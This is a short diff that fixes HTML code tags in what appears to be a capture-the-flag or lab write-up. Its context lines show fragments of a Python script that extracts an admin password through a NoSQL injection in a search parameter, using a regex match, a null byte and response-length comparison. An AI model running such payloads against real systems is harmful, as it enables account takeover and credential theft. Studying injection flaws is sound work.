@@ -53,8 +53,7 @@ keystr = keylist + x
 URL='[redacted]/?search=admin%27%20%26%26%20this.password.match(/^{}.*$/)%00'.format(keystr)
 r = requests.get(URL)
 s = (len(r.content))
-</code></pre>
-<code>  
+
 while True:
   try:
     for i in range(0, 17):    
@@ -85,4 +84,4 @@ while True:
     except:
       print("crackarooniedddddd")
       print('password is ' + keystr[:-1])
-      break  </code>
+      break  </code></pre>
